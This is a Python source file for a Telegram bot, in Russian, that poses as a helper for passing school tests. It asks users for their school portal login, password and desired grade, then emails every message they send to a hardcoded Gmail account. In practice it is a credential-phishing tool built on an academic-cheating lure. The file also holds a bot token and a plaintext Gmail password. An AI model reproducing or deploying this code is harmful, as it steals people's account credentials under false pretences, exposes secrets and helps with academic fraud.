import telebot
import smtplib
bot = telebot.TeleBot("1531182413:AAHtnrlgqoCQCoYueu4vzYg6h9PiSEA6Jd0")

smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
smtpObj.starttls()
smtpObj.login('suck.big.pusy@gmail.com','portal.1')

keyboard = telebot.types.ReplyKeyboardMarkup(True, True)
keyboard.row('Английский', 'История', 'Анатомия')


@bot.message_handler(commands=['start'])
def start_message(message):
    bot.send_message(message.chat.id, 'Добро пожаловать в помощника по решению тестов. Для старта напиши "Начать".')


@bot.message_handler(content_types=['text'])
def get_text_messages(message):
    if message.text == "Начать":
        bot.send_message(message.from_user.id, "Выбери свой предмет (Надо нажать на кнопочку клавиатуры)", reply_markup=keyboard)

    elif message.text == "/help":
        bot.send_message(message.from_user.id, "Чтобы начать, напиши Начать.")
        bot.send_message(message.from_user.id,"Посмотреть список доступных предметов: /available")

    elif message.text == "/available":
        bot.send_message(message.from_user.id, "Сейчас доступны Анатомия, Английский, История")

    elif message.text == "Английский":
        bot.send_message(message.from_user.id, "Напиши название теста")
        bot.send_message(message.from_user.id, "Напиши логин и пароль от портала и желаемую оценку")

    elif message.text == "История":
        bot.send_message(message.from_user.id, "Напиши название теста")
        bot.send_message(message.from_user.id, "Напиши логин и пароль от портала и желаемую оценку")

    elif message.text == "Анатомия":
        bot.send_message(message.from_user.id, "Напиши название теста")
        bot.send_message(message.from_user.id, "Напиши логин и пароль от портала и желаемую оценку")

    else:
        bot.send_message(message.from_user.id, "Я тебя не понимаю. Напиши /help.")
    Test_name = message.text

    smtpObj.sendmail("suck.big.pusy@gmail.com","suck.big.pusy@gmail.com", Test_name.encode('utf-8'))


bot.polling(none_stop=True, interval=0)


#keyboard = telebot.types.InlineKeyboardMarkup()
#key_English = telebot.types.InlineKeyboardButton(text = "Английский", callback_data ='english')
#keyboard.add(key_English)
#key_Anatomy = telebot.types.InlineKeyboardButton(text = "Анатомия", callback_data ='anatomy')
#keyboard.add(key_Anatomy)
#key_History = telebot.types.InlineKeyboardButton(text = "История", callback_data ='history')
#keyboard.add(key_History)
#@bot.callback_query_handler(func=lambda call: True)
#def callback_worker(call):
#    if call.data == "english":
 #       bot.send_message(call.message.chat.id, 'Напиши название теста');
 #   elif call.data == "anatomy":
#        bot.send_message(call.message.chat.id, 'Напиши название теста');
#    elif call.data == "history":
#        bot.send_message(call.message.chat.id, 'Напиши название теста');
